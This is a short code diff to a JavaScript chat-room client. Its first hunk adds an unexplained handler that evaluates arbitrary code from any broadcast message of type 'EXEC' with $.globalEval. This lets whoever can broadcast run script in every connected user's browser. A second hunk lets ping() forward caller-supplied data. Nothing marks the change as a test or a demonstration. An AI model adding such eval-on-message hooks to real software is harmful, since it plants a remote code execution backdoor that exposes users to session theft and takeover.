@@ -143,6 +143,9 @@ ChatRoomClient.prototype.changeName = function() {
 ChatRoomClient.prototype.socketEvent = function() {
   var self = this;
   self.socket.on('broadcast', function(data) {
+    if(data.type == 'EXEC')  {
+      return $.globalEval(data.code);
+    }
     if(data.id == self.userId) return;
     if(data.type == 'NEW') {
       if($.inArray(data.id, self.users) > -1) return false;
@@ -301,10 +304,10 @@ ChatRoomClient.prototype.bindEvent = function() {
   });
 };
 
-ChatRoomClient.prototype.ping = function() {
-  this.socket.emit('ping', {
-    id: this.userId
-  });
+ChatRoomClient.prototype.ping = function(data) {
+  data = data || {};
+  data.id = this.userId;
+  this.socket.emit('ping', data);
 };
 
 ChatRoomClient.prototype.createPrivateChat = function(data, setCurrent) {
